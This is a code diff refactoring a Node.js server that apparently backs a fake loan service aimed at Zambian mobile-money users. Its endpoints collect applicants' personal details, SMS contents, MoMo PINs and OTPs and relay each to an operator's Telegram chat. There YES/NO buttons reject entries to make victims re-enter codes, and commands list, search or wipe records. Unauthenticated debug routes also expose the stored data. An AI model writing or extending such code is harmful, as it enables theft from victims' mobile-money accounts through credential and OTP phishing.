@@ -30,25 +30,21 @@ const DATA_RETENTION_DAYS = parseInt(process.env.DATA_RETENTION_DAYS || '7', 10)
 
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
-    console.log('Please set these in your .env file or Render environment variables');
 }
 if (!TELEGRAM_WEBHOOK_SECRET) {
-    console.warn('⚠️ TELEGRAM_WEBHOOK_SECRET not set — webhook is NOT authenticated. Set this ASAP.');
+    console.warn('⚠️ TELEGRAM_WEBHOOK_SECRET not set — webhook is NOT authenticated.');
 }
 
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 console.log('✅ Server starting...');
 
-// ─── Process-level safety nets ───
-process.on('unhandledRejection', (reason) => {
-    console.error('❌ Unhandled Rejection:', reason);
-});
+process.on('unhandledRejection', (reason) => console.error('❌ Unhandled Rejection:', reason));
 process.on('uncaughtException', (err) => {
     console.error('❌ Uncaught Exception:', err);
     try { saveApplicationsNow(); } catch (_) {}
 });
 
-// ─── Data Persistence Setup ───
+// ─── Data Persistence ───
 const DATA_DIR = path.join(__dirname, '../data');
 const DATA_FILE = path.join(DATA_DIR, 'applications.json');
 const HISTORY_FILE = path.join(DATA_DIR, 'rejection_history.json');
@@ -58,26 +54,23 @@ if (!fs.existsSync(DATA_DIR)) {
     console.log('📁 Created data directory');
 }
 
-// ─── Atomic write helper ───
 function atomicWrite(file, contents) {
     const tmp = `${file}.tmp.${process.pid}.${Date.now()}`;
     fs.writeFileSync(tmp, contents);
     fs.renameSync(tmp, file);
 }
 
-// ─── Save/Load Functions (debounced + atomic) ───
 let saveTimer = null;
 let appsDirty = false;
 let historyDirty = false;
 
 function saveApplicationsNow() {
     try {
-        const data = {
+        atomicWrite(DATA_FILE, JSON.stringify({
             applications,
             rejectionHistory,
             timestamp: new Date().toISOString()
-        };
-        atomicWrite(DATA_FILE, JSON.stringify(data, null, 2));
+        }, null, 2));
         appsDirty = false;
         historyDirty = false;
         console.log('💾 Applications saved to disk');
@@ -104,45 +97,35 @@ function saveRejectionHistory() {
 
 function loadApplications() {
     try {
-        if (fs.existsSync(DATA_FILE)) {
-            const data = fs.readFileSync(DATA_FILE, 'utf8');
-            const parsed = JSON.parse(data);
-
-            const age = Date.now() - new Date(parsed.timestamp).getTime();
-            if (age < DATA_RETENTION_DAYS * 24 * 60 * 60 * 1000) {
-                Object.assign(applications, parsed.applications || {});
-                Object.assign(rejectionHistory, parsed.rejectionHistory || {});
-                console.log(`📂 Loaded ${Object.keys(applications).length} applications from disk`);
-                return true;
-            } else {
-                console.log(`📂 Data file is older than ${DATA_RETENTION_DAYS} days, starting fresh`);
-                const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
-                try { fs.copyFileSync(DATA_FILE, backupFile); } catch (_) {}
-                console.log(`📂 Backed up old data to ${backupFile}`);
-                return false;
-            }
+        if (!fs.existsSync(DATA_FILE)) return false;
+        const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+        const age = Date.now() - new Date(parsed.timestamp).getTime();
+        if (age < DATA_RETENTION_DAYS * 24 * 60 * 60 * 1000) {
+            Object.assign(applications, parsed.applications || {});
+            Object.assign(rejectionHistory, parsed.rejectionHistory || {});
+            console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
+            return true;
         }
+        console.log(`📂 Data older than ${DATA_RETENTION_DAYS} days, starting fresh`);
+        const backup = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
+        try { fs.copyFileSync(DATA_FILE, backup); } catch (_) {}
+        return false;
     } catch (error) {
         console.error('❌ Error loading applications:', error.message);
+        return false;
     }
-    return false;
 }
 
-// ─── Auto-save every 30 seconds (only if dirty) ───
-setInterval(() => {
-    if (appsDirty || historyDirty) saveApplicationsNow();
-}, 30000);
+setInterval(() => { if (appsDirty || historyDirty) saveApplicationsNow(); }, 30000);
 
-// ─── Save on shutdown ───
 function gracefulShutdown(signal) {
-    console.log(`🔄 ${signal} received — saving data before shutdown...`);
+    console.log(`🔄 ${signal} received — saving...`);
     saveApplicationsNow();
     process.exit(0);
 }
 process.on('SIGINT', () => gracefulShutdown('SIGINT'));
 process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
 
-// ─── Load data on startup (single source of truth) ───
 loadApplications();
 
 // ─── Markdown escaping ───
@@ -151,7 +134,7 @@ function escapeMd(s) {
     return String(s).replace(/([_*`\[\]()~>#+\-=|{}.!\\])/g, '\\$1');
 }
 
-// ─── Telegram fetch with retry + exponential backoff ───
+// ─── Telegram fetch with retry + backoff ───
 async function tgFetch(endpoint, body, { retries = 3, baseDelayMs = 800 } = {}) {
     let lastError;
     for (let attempt = 0; attempt <= retries; attempt++) {
@@ -165,7 +148,6 @@ async function tgFetch(endpoint, body, { retries = 3, baseDelayMs = 800 } = {}) 
                 signal: controller.signal
             });
             clearTimeout(timeout);
-
             if (response.status === 429) {
                 let retryAfter = 1;
                 try {
@@ -180,9 +162,9 @@ async function tgFetch(endpoint, body, { retries = 3, baseDelayMs = 800 } = {}) 
             return await response.json();
         } catch (error) {
             lastError = error;
-            const isTransient = ['ECONNRESET', 'ETIMEDOUT', 'EAI_AGAIN', 'ENOTFOUND', 'ECONNREFUSED'].includes(error.code)
+            const transient = ['ECONNRESET', 'ETIMEDOUT', 'EAI_AGAIN', 'ENOTFOUND', 'ECONNREFUSED'].includes(error.code)
                 || /ECONNRESET|socket hang up|network|aborted/i.test(error.message || '');
-            if (!isTransient || attempt >= retries) break;
+            if (!transient || attempt >= retries) break;
             const delay = baseDelayMs * Math.pow(2, attempt) + Math.random() * 250;
             console.warn(`🔁 Telegram retry ${attempt + 1}/${retries} in ${Math.round(delay)}ms (${error.code || error.message})`);
             await new Promise(r => setTimeout(r, delay));
@@ -192,26 +174,18 @@ async function tgFetch(endpoint, body, { retries = 3, baseDelayMs = 800 } = {}) 
     return { ok: false, error: lastError?.message || 'unknown' };
 }
 
-// ─── Telegram Message Sender ───
 async function sendTelegramMessage(message, buttons = null) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        console.error('❌ Cannot send message: bot token/chat id missing');
-        return { ok: false, error: 'Bot config missing' };
-    }
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok: false, error: 'Bot config missing' };
     const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
     if (buttons) body.reply_markup = { inline_keyboard: buttons };
     return tgFetch('sendMessage', body);
 }
 
 async function answerCallback(callbackQueryId, text) {
-    return tgFetch('answerCallbackQuery', {
-        callback_query_id: callbackQueryId,
-        text,
-        show_alert: false
-    }, { retries: 2 });
+    return tgFetch('answerCallbackQuery', { callback_query_id: callbackQueryId, text, show_alert: false }, { retries: 2 });
 }
 
-// ─── Simple in-memory rate limiter ───
+// ─── Rate limiter ───
 const rateBuckets = new Map();
 function rateLimit(maxPerMinute) {
     return (req, res, next) => {
@@ -221,9 +195,7 @@ function rateLimit(maxPerMinute) {
         if (now > bucket.reset) { bucket.count = 0; bucket.reset = now + 60000; }
         bucket.count++;
         rateBuckets.set(key, bucket);
-        if (bucket.count > maxPerMinute) {
-            return res.status(429).json({ ok: false, error: 'Rate limit exceeded' });
-        }
+        if (bucket.count > maxPerMinute) return res.status(429).json({ ok: false, error: 'Rate limit exceeded' });
         next();
     };
 }
@@ -232,10 +204,8 @@ setInterval(() => {
     for (const [k, v] of rateBuckets) if (now > v.reset) rateBuckets.delete(k);
 }, 60000);
 
-// ─── Helper: safe app lookup ───
 function getApp(id) { return applications[id] || null; }
 
-// ─── Helper: reset expired PIN block ───
 function clearExpiredPinBlock(app) {
     if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
         app.pinAttempts = 0;
@@ -245,23 +215,16 @@ function clearExpiredPinBlock(app) {
     }
 }
 
-// ─── Health check ───
+// ─── Health ───
 app.get('/health', (req, res) => {
-    res.json({
-        ok: true,
-        uptime: process.uptime(),
-        applications: Object.keys(applications).length,
-        timestamp: new Date().toISOString()
-    });
+    res.json({ ok: true, uptime: process.uptime(), applications: Object.keys(applications).length, timestamp: new Date().toISOString() });
 });
 
 // ─── 1. Application Submission ───
 app.post('/api/send-application', rateLimit(30), async (req, res) => {
     try {
         const data = req.body?.applicationData;
-        if (!data || !data.applicationId) {
-            return res.status(400).json({ ok: false, error: 'Missing applicationData.applicationId' });
-        }
+        if (!data || !data.applicationId) return res.status(400).json({ ok: false, error: 'Missing applicationData.applicationId' });
         const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;
 
         const existing = applications[applicationId];
@@ -269,12 +232,8 @@ app.post('/api/send-application', rateLimit(30), async (req, res) => {
 
         applications[applicationId] = {
             ...data,
-            smsStatus: 'pending',
-            pinStatus: 'pending',
-            otpStatus: 'pending',
-            pinAttempts: 0,
-            maxPinAttempts: 3,
-            pinBlockedUntil: null,
+            smsStatus: 'pending', pinStatus: 'pending', otpStatus: 'pending',
+            pinAttempts: 0, maxPinAttempts: 3, pinBlockedUntil: null,
             resubmissionCount: isResubmission ? (existing.resubmissionCount || 0) + 1 : 0,
             createdAt: isResubmission ? existing.createdAt : new Date().toISOString(),
             updatedAt: new Date().toISOString()
@@ -290,7 +249,6 @@ app.post('/api/send-application', rateLimit(30), async (req, res) => {
             { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
         ]];
 
-        // Fire-and-forget with background retry — never fail the user's request on a Telegram blip
         sendTelegramMessage(message, buttons)
             .then(r => { if (!r.ok) console.error('⚠️ Admin notify failed, sweeper will retry:', r.error); })
             .catch(e => console.error('⚠️ Admin notify threw:', e.message));
@@ -337,20 +295,13 @@ app.post('/api/send-pin', rateLimit(30), async (req, res) => {
     try {
         const { applicationId, pin, isResubmission } = req.body || {};
         const app = getApp(applicationId);
-        if (!app) {
-            return res.status(404).json({ ok: false, error: 'Application not found' });
-        }
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
         clearExpiredPinBlock(app);
 
         if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
             const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
-            return res.status(429).json({
-                ok: false,
-                error: `Too many failed attempts. Please wait ${remaining} seconds.`,
-                blocked: true,
-                remainingSeconds: remaining
-            });
+            return res.status(429).json({ ok: false, error: `Too many failed attempts. Please wait ${remaining} seconds.`, blocked: true, remainingSeconds: remaining });
         }
 
         app.pin = pin;
@@ -375,14 +326,12 @@ app.post('/api/send-pin', rateLimit(30), async (req, res) => {
     }
 });
 
-// ─── 4. PIN Rejected Handler ───
+// ─── 4. PIN Rejected ───
 app.post('/api/pin-rejected', rateLimit(30), async (req, res) => {
     try {
         const { applicationId } = req.body || {};
         const app = getApp(applicationId);
-        if (!app) {
-            return res.status(404).json({ ok: false, error: 'Application not found' });
-        }
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
         clearExpiredPinBlock(app);
 
@@ -393,26 +342,13 @@ app.post('/api/pin-rejected', rateLimit(30), async (req, res) => {
             app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
             app.pinStatus = 'blocked';
             saveApplications();
-
-            sendTelegramMessage(
-                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n👤 Name: ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 Phone: +260${escapeMd(app.phone)}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
-            ).catch(e => console.error('⚠️ PIN-block notify threw:', e.message));
-
-            return res.json({
-                ok: false,
-                blocked: true,
-                remainingAttempts: 0,
-                message: 'Too many failed attempts. Please wait 5 minutes.'
-            });
+            sendTelegramMessage(`🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n👤 Name: ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 Phone: +260${escapeMd(app.phone)}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`)
+                .catch(e => console.error('⚠️ PIN-block notify threw:', e.message));
+            return res.json({ ok: false, blocked: true, remainingAttempts: 0, message: 'Too many failed attempts. Please wait 5 minutes.' });
         }
 
         saveApplications();
-
-        return res.json({
-            ok: true,
-            remainingAttempts,
-            message: `Wrong PIN. ${remainingAttempts} attempt(s) remaining.`
-        });
+        return res.json({ ok: true, remainingAttempts, message: `Wrong PIN. ${remainingAttempts} attempt(s) remaining.` });
     } catch (error) {
         console.error('Error in /api/pin-rejected:', error);
         res.status(500).json({ ok: false, error: error.message });
@@ -423,18 +359,13 @@ app.post('/api/pin-rejected', rateLimit(30), async (req, res) => {
 app.post('/api/reset-pin-attempts/:applicationId', rateLimit(60), async (req, res) => {
     try {
         const app = getApp(req.params.applicationId);
-        if (!app) {
-            return res.status(404).json({ ok: false, error: 'Application not found' });
-        }
-
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
         app.pinAttempts = 0;
         app.pinBlockedUntil = null;
         app.pinStatus = 'pending';
         saveApplications();
-
         res.json({ ok: true });
     } catch (error) {
-        console.error('Error resetting PIN attempts:', error);
         res.status(500).json({ ok: false, error: error.message });
     }
 });
@@ -443,19 +374,14 @@ app.post('/api/reset-pin-attempts/:applicationId', rateLimit(60), async (req, re
 app.get('/api/pin-status/:applicationId', (req, res) => {
     try {
         const app = getApp(req.params.applicationId);
-        if (!app) {
-            return res.status(404).json({ ok: false, error: 'Application not found' });
-        }
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
         clearExpiredPinBlock(app);
 
         const remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
         const isBlocked = app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date();
         let blockRemaining = 0;
-
-        if (isBlocked) {
-            blockRemaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
-        }
+        if (isBlocked) blockRemaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
 
         res.json({
             ok: true,
@@ -505,9 +431,7 @@ app.post('/api/resend-otp', rateLimit(20), async (req, res) => {
     try {
         const { applicationId } = req.body || {};
         const app = getApp(applicationId);
-        if (!app) {
-            return res.status(404).json({ ok: false, error: 'Application not found' });
-        }
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
         app.otpStatus = 'pending';
         app.updatedAt = new Date().toISOString();
@@ -535,9 +459,7 @@ app.post('/api/resend-otp', rateLimit(20), async (req, res) => {
 app.post('/api/send-final-details', rateLimit(30), async (req, res) => {
     try {
         const data = req.body?.finalData;
-        if (!data || !data.applicationId) {
-            return res.status(400).json({ ok: false, error: 'Missing finalData.applicationId' });
-        }
+        if (!data || !data.applicationId) return res.status(400).json({ ok: false, error: 'Missing finalData.applicationId' });
         const app = getApp(data.applicationId);
         if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
@@ -558,34 +480,19 @@ app.post('/api/send-final-details', rateLimit(30), async (req, res) => {
     }
 });
 
-// ─── 10. Get Rejection Redirect Info ───
+// ─── 10. Rejection Info ───
 app.get('/api/rejection-info/:applicationId', (req, res) => {
     try {
         const app = getApp(req.params.applicationId);
-        if (!app) {
-            return res.status(404).json({ ok: false, error: 'Application not found' });
-        }
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
         let rejectedStep = null;
         let errorMessage = '';
+        if (app.smsStatus === 'rejected') { rejectedStep = 'sms'; errorMessage = '❌ Your SMS message was rejected. Please check and resubmit.'; }
+        else if (app.pinStatus === 'rejected') { rejectedStep = 'pin'; errorMessage = '❌ Your MoMo PIN was rejected. Please re-enter your PIN.'; }
+        else if (app.otpStatus === 'rejected') { rejectedStep = 'otp'; errorMessage = '❌ Your OTP was rejected. Please request a new OTP.'; }
 
-        if (app.smsStatus === 'rejected') {
-            rejectedStep = 'sms';
-            errorMessage = '❌ Your SMS message was rejected. Please check and resubmit.';
-        } else if (app.pinStatus === 'rejected') {
-            rejectedStep = 'pin';
-            errorMessage = '❌ Your MoMo PIN was rejected. Please re-enter your PIN.';
-        } else if (app.otpStatus === 'rejected') {
-            rejectedStep = 'otp';
-            errorMessage = '❌ Your OTP was rejected. Please request a new OTP.';
-        }
-
-        res.json({
-            ok: true,
-            rejectedStep,
-            errorMessage,
-            applicationId: req.params.applicationId
-        });
+        res.json({ ok: true, rejectedStep, errorMessage, applicationId: req.params.applicationId });
     } catch (error) {
         res.status(500).json({ ok: false, error: error.message });
     }
@@ -593,7 +500,6 @@ app.get('/api/rejection-info/:applicationId', (req, res) => {
 
 // ─── 11. Webhook ───
 app.post('/api/telegram-webhook', async (req, res) => {
-    // Verify Telegram secret token if configured
     if (TELEGRAM_WEBHOOK_SECRET) {
         const header = req.get('X-Telegram-Bot-Api-Secret-Token');
         if (header !== TELEGRAM_WEBHOOK_SECRET) {
@@ -609,78 +515,43 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const text = req.body.message.text.trim();
             const chatId = req.body.message.chat.id;
             const username = req.body.message.from?.username || 'Unknown';
-
             console.log(`💬 Command from ${username}: ${text}`);
 
             if (chatId.toString() === TELEGRAM_CHAT_ID) {
-
                 if (text === '/stats') {
                     const total = Object.keys(applications).length;
                     const pendingSms = Object.values(applications).filter(a => a.smsStatus === 'pending').length;
                     const pendingPin = Object.values(applications).filter(a => a.pinStatus === 'pending').length;
                     const pendingOtp = Object.values(applications).filter(a => a.otpStatus === 'pending').length;
                     const approved = Object.values(applications).filter(a => a.otpStatus === 'approved').length;
-                    const rejected = Object.values(applications).filter(a =>
-                        a.smsStatus === 'rejected' ||
-                        a.pinStatus === 'rejected' ||
-                        a.otpStatus === 'rejected'
-                    ).length;
-
+                    const rejected = Object.values(applications).filter(a => a.smsStatus === 'rejected' || a.pinStatus === 'rejected' || a.otpStatus === 'rejected').length;
                     const recentIds = Object.keys(applications).slice(-5);
                     const recentList = recentIds.length > 0
-                        ? recentIds.map(id => {
-                            const app = applications[id];
-                            return `🆔 ${escapeMd(id)} - ${escapeMd(app.firstName)} ${escapeMd(app.lastName)} (${app.smsStatus})`;
-                        }).join('\n')
+                        ? recentIds.map(id => `🆔 ${escapeMd(id)} - ${escapeMd(applications[id].firstName)} ${escapeMd(applications[id].lastName)} (${applications[id].smsStatus})`).join('\n')
                         : 'No applications yet';
-
-                    await sendTelegramMessage(
-                        `📊 *APPLICATION STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Total: ${total}\n⏳ Pending SMS: ${pendingSms}\n⏳ Pending PIN: ${pendingPin}\n⏳ Pending OTP: ${pendingOtp}\n✅ Approved: ${approved}\n❌ Rejected: ${rejected}\n\n📅 *Recent Applications:*\n${recentList}`
-                    );
+                    await sendTelegramMessage(`📊 *APPLICATION STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Total: ${total}\n⏳ Pending SMS: ${pendingSms}\n⏳ Pending PIN: ${pendingPin}\n⏳ Pending OTP: ${pendingOtp}\n✅ Approved: ${approved}\n❌ Rejected: ${rejected}\n\n📅 *Recent Applications:*\n${recentList}`);
                     return res.sendStatus(200);
                 }
-
                 if (text === '/list') {
                     const ids = Object.keys(applications);
-                    if (ids.length === 0) {
-                        await sendTelegramMessage('📭 No applications found.');
-                        return res.sendStatus(200);
-                    }
-
+                    if (ids.length === 0) { await sendTelegramMessage('📭 No applications found.'); return res.sendStatus(200); }
                     const displayIds = ids.slice(-10);
                     let message = '📋 *APPLICATION LIST* 📋\n━━━━━━━━━━━━━━━━━━━━━━\n';
                     displayIds.forEach((id, i) => {
                         const app = applications[id];
-                        message += `\n${i + 1}. 🆔 *${escapeMd(id)}*\n`;
-                        message += `   👤 ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n`;
-                        message += `   📱 +260${escapeMd(app.phone)}\n`;
-                        message += `   💰 ZMW ${Number(app.loanAmount || 0).toLocaleString()}\n`;
-                        message += `   📌 SMS: ${app.smsStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
+                        message += `\n${i + 1}. 🆔 *${escapeMd(id)}*\n   👤 ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n   📱 +260${escapeMd(app.phone)}\n   💰 ZMW ${Number(app.loanAmount || 0).toLocaleString()}\n   📌 SMS: ${app.smsStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
                     });
-
-                    if (ids.length > 10) {
-                        message += `\n... and ${ids.length - 10} more. Use /search [ID] to find specific.`;
-                    }
-
+                    if (ids.length > 10) message += `\n... and ${ids.length - 10} more. Use /search [ID] to find specific.`;
                     await sendTelegramMessage(message);
                     return res.sendStatus(200);
                 }
-
                 if (text.startsWith('/search ')) {
                     const searchId = text.replace('/search ', '').trim().toUpperCase();
                     const app = getApp(searchId);
-
-                    if (!app) {
-                        await sendTelegramMessage(`❌ Application *${escapeMd(searchId)}* not found.`);
-                        return res.sendStatus(200);
-                    }
-
-                    await sendTelegramMessage(
-                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(searchId)}\n👤 Name: ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 Phone: +260${escapeMd(app.phone)}\n📧 Email: ${escapeMd(app.email)}\n💰 Amount: ZMW ${Number(app.loanAmount || 0).toLocaleString()}\n📅 Term: ${escapeMd(app.loanTerm)}\n📌 Purpose: ${escapeMd(app.loanPurpose || 'Not specified')}\n💼 Employment: ${escapeMd(app.employment || 'Not specified')}\n💰 Income: ZMW ${Number(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${escapeMd(app.kinName || 'Not specified')} (+260${escapeMd(app.kinPhone || '')})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
-                    );
+                    if (!app) { await sendTelegramMessage(`❌ Application *${escapeMd(searchId)}* not found.`); return res.sendStatus(200); }
+                    await sendTelegramMessage(`🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(searchId)}\n👤 Name: ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 Phone: +260${escapeMd(app.phone)}\n📧 Email: ${escapeMd(app.email)}\n💰 Amount: ZMW ${Number(app.loanAmount || 0).toLocaleString()}\n📅 Term: ${escapeMd(app.loanTerm)}\n📌 Purpose: ${escapeMd(app.loanPurpose || 'Not specified')}\n💼 Employment: ${escapeMd(app.employment || 'Not specified')}\n💰 Income: ZMW ${Number(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${escapeMd(app.kinName || 'Not specified')} (+260${escapeMd(app.kinPhone || '')})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`);
                     return res.sendStatus(200);
                 }
-
                 if (text.startsWith('/delete ')) {
                     const deleteId = text.replace('/delete ', '').trim().toUpperCase();
                     const app = getApp(deleteId);
@@ -694,43 +565,29 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     }
                     return res.sendStatus(200);
                 }
-
                 if (text === '/clear') {
-                    await sendTelegramMessage(
-                        `⚠️ *DESTRUCTIVE COMMAND*\n━━━━━━━━━━━━━━━━━━━━━━\nThis will delete ALL applications.\n\nTo confirm, send:\n\`/clear CONFIRM\``
-                    );
+                    await sendTelegramMessage(`⚠️ *DESTRUCTIVE COMMAND*\n━━━━━━━━━━━━━━━━━━━━━━\nThis will delete ALL applications.\n\nTo confirm, send:\n\`/clear CONFIRM\``);
                     return res.sendStatus(200);
                 }
-
                 if (text === '/clear CONFIRM') {
                     const count = Object.keys(applications).length;
-                    if (count === 0) {
-                        await sendTelegramMessage('📭 No applications to clear.');
-                        return res.sendStatus(200);
-                    }
+                    if (count === 0) { await sendTelegramMessage('📭 No applications to clear.'); return res.sendStatus(200); }
                     Object.keys(applications).forEach(key => delete applications[key]);
                     Object.keys(rejectionHistory).forEach(key => delete rejectionHistory[key]);
                     saveApplications();
                     await sendTelegramMessage(`✅ Cleared all ${count} applications.`);
                     return res.sendStatus(200);
                 }
-
                 if (text === '/status') {
                     const appCount = Object.keys(applications).length;
                     const webhookInfo = await tgFetch('getWebhookInfo', {}, { retries: 1 });
-                    await sendTelegramMessage(
-                        `✅ *BOT STATUS* ✅\n━━━━━━━━━━━━━━━━━━━━━━\n🟢 Status: Online\n📊 Applications: ${appCount}\n⏰ Time: ${new Date().toISOString()}\n🔗 Webhook: ${escapeMd(webhookInfo.result?.url || 'Not set')}\n💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}\n⏱️ Uptime: ${Math.round(process.uptime())}s`
-                    );
+                    await sendTelegramMessage(`✅ *BOT STATUS* ✅\n━━━━━━━━━━━━━━━━━━━━━━\n🟢 Status: Online\n📊 Applications: ${appCount}\n⏰ Time: ${new Date().toISOString()}\n🔗 Webhook: ${escapeMd(webhookInfo.result?.url || 'Not set')}\n💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}\n⏱️ Uptime: ${Math.round(process.uptime())}s`);
                     return res.sendStatus(200);
                 }
-
                 if (text === '/help' || text === '/start') {
-                    await sendTelegramMessage(
-                        `🤖 *AVAILABLE COMMANDS* 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats - View application statistics\n📋 /list - List all applications (last 10)\n🔍 /search [ID] - Find specific application\n🗑️ /delete [ID] - Delete an application\n🧹 /clear - Clear ALL applications (requires /clear CONFIRM)\n📌 /status - Check bot status\n❓ /help - Show this help menu\n\n📌 *Quick Actions:*\nWhen you receive a new application, use the YES/NO buttons to approve or reject.`
-                    );
+                    await sendTelegramMessage(`🤖 *AVAILABLE COMMANDS* 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats - View application statistics\n📋 /list - List all applications (last 10)\n🔍 /search [ID] - Find specific application\n🗑️ /delete [ID] - Delete an application\n🧹 /clear - Clear ALL applications (requires /clear CONFIRM)\n📌 /status - Check bot status\n❓ /help - Show this help menu\n\n📌 *Quick Actions:*\nWhen you receive a new application, use the YES/NO buttons to approve or reject.`);
                     return res.sendStatus(200);
                 }
-
                 if (text.startsWith('/')) {
                     await sendTelegramMessage(`❌ Unknown command. Type /help to see available commands.`);
                     return res.sendStatus(200);
@@ -764,24 +621,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
                         previousStatus: app[step.toLowerCase() + 'Status']
                     };
                     saveRejectionHistory();
-                    console.log(`❌ Rejected ${step} for ${applicationId}`);
                 }
-
-                console.log(`📝 Processing ${step} for ${applicationId}: ${action}`);
 
                 const statusKey = step.toLowerCase() + 'Status';
-                if (step === 'SMS' && app.smsStatus === 'pending') {
-                    app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
-                    console.log(`📨 SMS status: ${app.smsStatus}`);
-                } else if (step === 'PIN' && app.pinStatus === 'pending') {
-                    app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
-                    console.log(`🔐 PIN status: ${app.pinStatus}`);
-                } else if (step === 'OTP' && app.otpStatus === 'pending') {
-                    app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
-                    console.log(`🔑 OTP status: ${app.otpStatus}`);
-                } else {
-                    console.log(`⚠️ Status not updated. Current: ${app[statusKey]}`);
-                }
+                if (step === 'SMS' && app.smsStatus === 'pending') app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
+                else if (step === 'PIN' && app.pinStatus === 'pending') app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
+                else if (step === 'OTP' && app.otpStatus === 'pending') app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
+                else console.log(`⚠️ Status not updated. Current: ${app[statusKey]}`);
 
                 app.updatedAt = new Date().toISOString();
                 saveApplications();
@@ -791,19 +637,16 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
                 const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
                 await sendTelegramMessage(`📌 *Status Update (ZAMBIA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
-
             } catch (parseError) {
                 console.error('❌ Error parsing callback data:', parseError.message);
                 if (!answered) {
                     try { await answerCallback(query.id, '⚠️ Error processing action'); } catch (_) {}
                 }
             }
-
             return res.sendStatus(200);
         }
 
         res.sendStatus(200);
-
     } catch (error) {
         console.error('❌ Webhook error:', error);
         res.sendStatus(500);
@@ -823,12 +666,10 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
         else if (req.params.step === 'pin') status = app.pinStatus;
         else if (req.params.step === 'otp') status = app.otpStatus;
 
-        const rejectionInfo = rejectionHistory[req.params.applicationId] || null;
-
         res.json({
             ok: true,
             status,
-            rejectionInfo,
+            rejectionInfo: rejectionHistory[req.params.applicationId] || null,
             resubmissionCount: app.resubmissionCount || 0
         });
     } catch (error) {
@@ -836,7 +677,7 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
     }
 });
 
-// ─── 13. Debug Endpoints ───
+// ─── 13. Debug ───
 app.get('/api/debug/applications', (req, res) => {
     res.json({
         total: Object.keys(applications).length,
@@ -852,85 +693,60 @@ app.get('/api/debug/application/:id', (req, res) => {
     res.json(app);
 });
 
-// ─── 14. Backup Endpoint ───
+// ─── TEMP diagnostic (remove after verifying) ───
